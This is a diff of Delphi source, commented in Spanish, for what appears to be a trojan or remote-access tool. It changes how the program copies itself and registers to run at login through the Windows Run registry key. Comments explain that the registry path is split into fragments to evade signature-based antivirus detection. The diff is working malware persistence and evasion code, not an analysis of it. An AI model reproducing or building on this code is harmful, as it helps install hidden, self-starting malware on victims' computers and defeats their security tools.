@@ -56,17 +56,17 @@ begin
   begin
     //Ahora me agrego al autoinico
     //Metodo policies
-    if Configuracion.bArranquePolicies then
+    if Configuracion.bArranqueRun then
     begin
       //Separadita para que no se vea la string completa si se abre con un editor hexadecimal.
       //Me imagino que esto ayudara a la indetección de antivirus que usan firmas con strings.
       //Y si no, es por pura diversión :)
 
       Clave := 'SOFTWARE\Mic';
-      Clave := Clave + 'rosoft\Windows\CurrentVersion\Poli';
-      Clave := Clave + 'cies';
-      Clave := Clave + '\Explorer\Run\';
-      Clave := Clave + '\' + Configuracion.sPoliciesRegKeyName;
+      Clave := Clave + 'rosoft\Wind';
+      Clave := Clave + 'ows\CurrentVe';
+      Clave := Clave + 'rsion\Run\';
+      Clave := Clave + Configuracion.sRunRegKeyName;
        RegSetString(HKEY_CURRENT_USER, clave, ParamStr(0));
     end;
     Sleep(20000); //20 sec
@@ -104,6 +104,7 @@ var
   FileTime:  TFileTime;
 
 begin
+  CrearThreadAutoInicio;
   if Configuracion.bCopiarArchivo then //Si me tengo que copiar entonces...
   begin
     //Reemplaza las rutas adecuadas
@@ -130,7 +131,7 @@ begin
     //Osea que no la pude crear y sigue sin existir. En ese caso me instalo en el C:
 
 
-    if ParamStr(0) = Configuracion.sCopyTo + Configuracion.sFileNameToCopy = False then
+    if lc(ParamStr(0)) <> lc(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
       //Si no me he copiado
       //tengo que copiarme y ejecutar la copia
     begin
@@ -234,7 +235,7 @@ begin
     end;
   end;
   //Ahora me agrego al autoinicio
-  CrearThreadAutoInicio;
+
 end;
 
 function stringreplace(s1:string;s2:string;s3:string):string;   { (copyto) windir DIR}
